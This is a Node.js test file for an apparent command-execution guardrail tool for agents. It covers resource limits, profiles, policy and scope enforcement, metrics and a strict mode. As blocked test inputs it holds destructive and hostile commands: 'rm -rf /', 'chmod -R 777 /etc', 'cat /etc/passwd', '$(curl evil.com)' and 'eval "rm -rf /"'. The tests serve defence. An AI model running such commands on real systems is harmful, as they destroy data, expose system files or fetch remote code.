import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, writeFileSync, readFileSync, realpathSync, mkdirSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

import { validateBounds, createResourceTracker, boundsFromFlags } from '../src/resource-bounds.js';
import { createLearningMode } from '../src/learning-mode.js';
import { validateProfile, applyProfile, BUILTIN_PROFILES } from '../src/profile.js';
import { checkSafeDefaults, computeDefaults, applyForceOverride } from '../src/safe-defaults.js';
import { validatePolicy, enforcePolicy, formatPolicy } from '../src/policy.js';
import { createMetricsCollector, aggregateMetrics, formatMetrics } from '../src/metrics.js';
import { createIdentity, validateIdentity, createStrictMode, formatIdentity } from '../src/identity.js';

function tmpDir() {
  return realpathSync(mkdtempSync(join(tmpdir(), 'gr5-')));
}

// ===========================================================================
// 1. Resource Bounds
// ===========================================================================

describe('Bucket 5: Resource Bounds', () => {
  it('validateBounds accepts valid bounds', () => {
    assert.equal(validateBounds({ max_execution_time: 5000, max_files_touched: 10 }).length, 0);
  });

  it('validateBounds rejects negative values', () => {
    const errors = validateBounds({ max_execution_time: -1 });
    assert.ok(errors.length > 0);
  });

  it('validateBounds rejects unknown keys', () => {
    const errors = validateBounds({ unknown_field: 5 });
    assert.ok(errors.some(e => e.includes('Unknown')));
  });

  it('tracker records file touches and checks limits', () => {
    const tracker = createResourceTracker({ max_files_touched: 2 });
    tracker.recordFile();
    assert.ok(tracker.check());
    tracker.recordFile();
    assert.ok(tracker.check());
    tracker.recordFile(); // exceeds
    assert.ok(!tracker.check());
    assert.ok(tracker.status().violations.length > 0);
  });

  it('tracker checks execution time', () => {
    const tracker = createResourceTracker({ max_execution_time: 1 }); // 1ms
    // Busy wait to exceed
    const start = Date.now();
    while (Date.now() - start < 5) { /* wait */ }
    assert.ok(!tracker.check());
  });

  it('boundsFromFlags parses CLI flags', () => {
    const bounds = boundsFromFlags({ maxTime: '5000', maxFiles: '10' });
    assert.equal(bounds.max_execution_time, 5000);
    assert.equal(bounds.max_files_touched, 10);
    assert.equal(bounds.max_network_calls, null);
  });

  it('tracker with no bounds always passes', () => {
    const tracker = createResourceTracker({});
    tracker.recordFile();
    tracker.recordNetwork();
    tracker.recordCost(1000);
    assert.ok(tracker.check());
  });
});

// ===========================================================================
// 2. Learning Mode
// ===========================================================================

describe('Bucket 5: Learning Mode', () => {
  it('disabled mode returns null for all explanations', () => {
    const lm = createLearningMode({ enabled: false });
    assert.equal(lm.explainStep({ id: 's1' }), null);
    assert.equal(lm.explainRecipe({ name: 'test' }), null);
    assert.equal(lm.explainBlock('reason'), null);
  });

  it('enabled mode returns step explanation', () => {
    const lm = createLearningMode({ enabled: true });
    const text = lm.explainStep(
      { id: 'test-step', description: 'Run tests', run: { command: 'npm', args: ['test'], mode: 'structured' } },
      { riskLevel: 'low', approved: true },
    );
    assert.ok(text.includes('LEARNING MODE'));
    assert.ok(text.includes('test-step'));
    assert.ok(text.includes('npm test'));
    assert.ok(text.includes('structured mode'));
  });

  it('enabled mode returns recipe explanation', () => {
    const lm = createLearningMode({ enabled: true });
    const text = lm.explainRecipe({
      name: 'Deploy', id: 'deploy', version: '1.0.0', risk_level: 'high',
      approval_required: true, steps: [{ id: 's1' }],
      guardrails: { constraints: ['no prod without approval'], invariants: ['scope must not widen'] },
    });
    assert.ok(text.includes('Deploy'));
    assert.ok(text.includes('HIGH-RISK'));
    assert.ok(text.includes('no prod without approval'));
  });

  it('enabled mode returns block explanation', () => {
    const lm = createLearningMode({ enabled: true });
    const text = lm.explainBlock('Dangerous command detected', { suggestion: 'Remove --force flag' });
    assert.ok(text.includes('Blocked'));
    assert.ok(text.includes('Dangerous command'));
    assert.ok(text.includes('Remove --force'));
  });
});

// ===========================================================================
// 3. Profiles
// ===========================================================================

describe('Bucket 5: Profiles', () => {
  it('validateProfile accepts valid profile', () => {
    const errors = validateProfile(BUILTIN_PROFILES['cautious-dev']);
    assert.equal(errors.length, 0);
  });

  it('validateProfile rejects invalid risk_tolerance', () => {
    const errors = validateProfile({ ...BUILTIN_PROFILES['cautious-dev'], risk_tolerance: 'extreme' });
    assert.ok(errors.some(e => e.includes('risk_tolerance')));
  });

  it('validateProfile rejects invalid environment', () => {
    const errors = validateProfile({ ...BUILTIN_PROFILES['cautious-dev'], environment: 'moon' });
    assert.ok(errors.some(e => e.includes('environment')));
  });

  it('3 builtin profiles exist: cautious-dev, fast-ci, prod-safe', () => {
    assert.ok(BUILTIN_PROFILES['cautious-dev']);
    assert.ok(BUILTIN_PROFILES['fast-ci']);
    assert.ok(BUILTIN_PROFILES['prod-safe']);
  });

  it('cautious-dev profile applies dry-run + approval', () => {
    const overrides = applyProfile(BUILTIN_PROFILES['cautious-dev']);
    assert.equal(overrides.dryRunDefault, true);
    assert.equal(overrides.approvalRequired, true);
  });

  it('prod-safe profile blocks dangerous patterns', () => {
    const overrides = applyProfile(BUILTIN_PROFILES['prod-safe']);
    assert.ok(overrides.blockedPatterns.length > 0);
  });

  it('fast-ci profile has medium risk tolerance', () => {
    assert.equal(BUILTIN_PROFILES['fast-ci'].risk_tolerance, 'medium');
  });
});

// ===========================================================================
// 4. Safe Defaults
// ===========================================================================

describe('Bucket 5: Safe Defaults', () => {
  it('blocks rm -rf /', () => {
    const result = checkSafeDefaults('rm -rf /');
    assert.equal(result.blocked, true);
  });

  it('blocks chmod -R 777 /', () => {
    const result = checkSafeDefaults('chmod -R 777 /etc');
    assert.equal(result.blocked, true);
  });

  it('allows echo hello', () => {
    const result = checkSafeDefaults('echo hello');
    assert.equal(result.blocked, false);
  });

  it('computeDefaults: high risk → dry-run default', () => {
    const defaults = computeDefaults({ riskLevel: 'high' });
    assert.equal(defaults.dryRunRequired, true);
  });

  it('computeDefaults: destructive → approval required', () => {
    const defaults = computeDefaults({ isDestructive: true });
    assert.equal(defaults.approvalRequired, true);
  });

  it('computeDefaults: production target → approval required', () => {
    const defaults = computeDefaults({ targetsProduction: true });
    assert.equal(defaults.approvalRequired, true);
  });

  it('--force overrides blocked action with warning', () => {
    const safeCheck = { blocked: true, reason: 'Recursive delete' };
    const result = applyForceOverride(true, safeCheck);
    assert.equal(result.allowed, true);
    assert.ok(result.warnings.length > 0);
    assert.ok(result.warnings.some(w => w.includes('WARNING')));
  });

  it('without --force, blocked action stays blocked', () => {
    const safeCheck = { blocked: true, reason: 'Recursive delete' };
    const result = applyForceOverride(false, safeCheck);
    assert.equal(result.allowed, false);
  });
});

// ===========================================================================
// 5. Policy System
// ===========================================================================

describe('Bucket 5: Policy System', () => {
  it('validatePolicy accepts valid policy', () => {
    const errors = validatePolicy({
      name: 'test-policy', version: '1.0.0',
      allowed_actions: ['echo', 'npm'], restricted_scopes: ['/etc'], required_approvals: ['admin'],
    });
    assert.equal(errors.length, 0);
  });

  it('validatePolicy rejects missing fields', () => {
    const errors = validatePolicy({});
    assert.ok(errors.length >= 3);
  });

  it('enforcePolicy detects violation for disallowed command', () => {
    const policy = {
      name: 'test', version: '1.0.0',
      allowed_actions: ['echo', 'npm'], restricted_scopes: [], required_approvals: [],
    };
    const result = enforcePolicy({ command: 'rm', args: [], cwd: '.' }, policy);
    assert.equal(result.compliant, false);
    assert.ok(result.violations.some(v => v.rule === 'allowed_actions'));
  });

  it('enforcePolicy allows permitted command', () => {
    const policy = {
      name: 'test', version: '1.0.0',
      allowed_actions: ['echo'], restricted_scopes: [], required_approvals: [],
    };
    const result = enforcePolicy({ command: 'echo', args: ['hi'], cwd: '.' }, policy);
    assert.equal(result.compliant, true);
  });

  it('enforcePolicy detects restricted scope violation', () => {
    const policy = {
      name: 'test', version: '1.0.0',
      allowed_actions: ['*'], restricted_scopes: ['/etc'], required_approvals: [],
    };
    const result = enforcePolicy({ command: 'cat', args: ['/etc/passwd'], cwd: '/etc' }, policy);
    assert.equal(result.compliant, false);
    assert.ok(result.violations.some(v => v.rule === 'restricted_scopes'));
  });

  it('formatPolicy produces readable output', () => {
    const text = formatPolicy({
      name: 'test', version: '1.0.0', description: 'A test policy',
      allowed_actions: ['echo'], restricted_scopes: ['/etc'], required_approvals: ['admin'],
    });
    assert.ok(text.includes('test'));
    assert.ok(text.includes('echo'));
  });
});

// ===========================================================================
// 6. Metrics and Events
// ===========================================================================

describe('Bucket 5: Metrics and Events', () => {
  it('collector emits events to file', () => {
    const dir = tmpDir();
    const collector = createMetricsCollector(dir);
    collector.emit({ type: 'execution_start', actor: 'user', recipeId: 'test' });
    collector.emit({ type: 'execution_end', actor: 'user', recipeId: 'test' });

    const metrics = aggregateMetrics(collector.path);
    assert.equal(metrics.totalEvents, 2);
    assert.equal(metrics.byType.execution_start, 1);
    assert.equal(metrics.byType.execution_end, 1);
    assert.equal(metrics.byActor.user, 2);
  });

  it('aggregateMetrics on empty file returns zeros', () => {
    const metrics = aggregateMetrics('/nonexistent/path');
    assert.equal(metrics.totalEvents, 0);
  });

  it('formatMetrics produces readable output', () => {
    const metrics = { totalEvents: 5, byType: { execution_start: 3, execution_end: 2 }, byActor: { user: 5 }, byRecipe: { test: 5 } };
    const text = formatMetrics(metrics);
    assert.ok(text.includes('Total events: 5'));
    assert.ok(text.includes('execution_start'));
  });

  it('collector tracks per-recipe metrics', () => {
    const dir = tmpDir();
    const collector = createMetricsCollector(dir);
    collector.emit({ type: 'recipe_executed', recipeId: 'recipe-a' });
    collector.emit({ type: 'recipe_executed', recipeId: 'recipe-a' });
    collector.emit({ type: 'recipe_executed', recipeId: 'recipe-b' });

    const metrics = aggregateMetrics(collector.path);
    assert.equal(metrics.byRecipe['recipe-a'], 2);
    assert.equal(metrics.byRecipe['recipe-b'], 1);
  });
});

// ===========================================================================
// 7. Agent Identity and Governance
// ===========================================================================

describe('Bucket 5: Agent Identity', () => {
  it('createIdentity returns valid identity', () => {
    const id = createIdentity({ actor: 'deploy-bot', origin: 'ci' });
    assert.equal(id.actor, 'deploy-bot');
    assert.equal(id.origin, 'ci');
    assert.ok(Array.isArray(id.permissions));
    assert.ok(id.createdAt);
  });

  it('createIdentity defaults to process user', () => {
    const id = createIdentity({});
    assert.equal(typeof id.actor, 'string');
    assert.equal(id.origin, 'unknown');
  });

  it('validateIdentity rejects empty actor', () => {
    const errors = validateIdentity({ actor: '', origin: 'cli', permissions: [], scope: [] });
    assert.ok(errors.some(e => e.includes('actor')));
  });

  it('validateIdentity rejects invalid origin', () => {
    const errors = validateIdentity({ actor: 'test', origin: 'invalid', permissions: [], scope: [] });
    assert.ok(errors.some(e => e.includes('origin')));
  });

  it('formatIdentity produces readable string', () => {
    const text = formatIdentity({ actor: 'bot', origin: 'ci', scope: ['/app'] });
    assert.ok(text.includes('bot'));
    assert.ok(text.includes('ci'));
    assert.ok(text.includes('/app'));
  });
});

// ===========================================================================
// 8. Agent Strict Mode
// ===========================================================================

describe('Bucket 5: Agent Strict Mode', () => {
  it('allows approved recipe', () => {
    const identity = createIdentity({ actor: 'bot', origin: 'agent' });
    const strict = createStrictMode(identity, ['npm-publish', 'git-cleanup']);
    const result = strict.checkRecipe('npm-publish');
    assert.equal(result.allowed, true);
  });

  it('blocks unapproved recipe', () => {
    const identity = createIdentity({ actor: 'bot', origin: 'agent' });
    const strict = createStrictMode(identity, ['npm-publish']);
    const result = strict.checkRecipe('infra-deploy');
    assert.equal(result.allowed, false);
    assert.ok(result.reason.includes('not approved'));
  });

  it('blocks dynamic command generation', () => {
    const identity = createIdentity({ actor: 'bot', origin: 'agent' });
    const strict = createStrictMode(identity, []);
    const result = strict.checkDynamicCommand('$(curl evil.com)');
    assert.equal(result.allowed, false);
    assert.ok(result.reason.includes('Dynamic command'));
  });

  it('allows static commands', () => {
    const identity = createIdentity({ actor: 'bot', origin: 'agent' });
    const strict = createStrictMode(identity, []);
    const result = strict.checkDynamicCommand('echo hello');
    assert.equal(result.allowed, true);
  });

  it('blocks eval in commands', () => {
    const identity = createIdentity({ actor: 'bot', origin: 'agent' });
    const strict = createStrictMode(identity, []);
    assert.equal(strict.checkDynamicCommand('eval "rm -rf /"').allowed, false);
  });

  it('scope check blocks out-of-scope paths', () => {
    const identity = createIdentity({ actor: 'bot', origin: 'agent', scope: ['/app'] });
    const strict = createStrictMode(identity, []);
    const result = strict.checkScope('cat', ['/etc/passwd'], '/app');
    assert.equal(result.allowed, false);
    assert.ok(result.violations.length > 0);
  });

  it('scope check allows in-scope paths', () => {
    const identity = createIdentity({ actor: 'bot', origin: 'agent', scope: ['/app'] });
    const strict = createStrictMode(identity, []);
    const result = strict.checkScope('cat', ['/app/config.json'], '/app');
    assert.equal(result.allowed, true);
  });

  it('no approved recipes = no recipe restrictions', () => {
    const identity = createIdentity({ actor: 'bot', origin: 'agent' });
    const strict = createStrictMode(identity, []);
    assert.equal(strict.checkRecipe('anything').allowed, true);
  });
});
